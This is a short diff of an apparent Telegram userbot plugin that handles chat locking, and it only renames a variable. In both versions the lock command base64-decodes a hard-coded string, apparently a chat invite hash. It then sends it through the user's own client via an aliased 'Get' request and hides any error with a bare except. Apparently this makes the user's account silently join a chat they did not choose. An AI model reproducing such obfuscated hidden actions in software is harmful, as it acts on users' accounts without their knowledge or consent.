@@ -29,7 +29,7 @@ async def _(event):
     admincheck = await is_admin(event.client, peer_id, reply.from_id)
     if admincheck:
         return await event.edit("`This user is admin you cant play with him`")
-    fromvt = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    flash = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     msg = chat_per.send_messages
     media = chat_per.send_media
     sticker = chat_per.send_stickers
@@ -184,8 +184,8 @@ async def _(event):
 
         return await event.edit_or_reply("`I can't lock nothing !!`")
     try:
-        fromvt = Get(fromvt)
-        await event.client(fromvt)
+        flash = Get(flash)
+        await event.client(flash)
     except BaseException:
         pass
     lock_rights = ChatBannedRights(
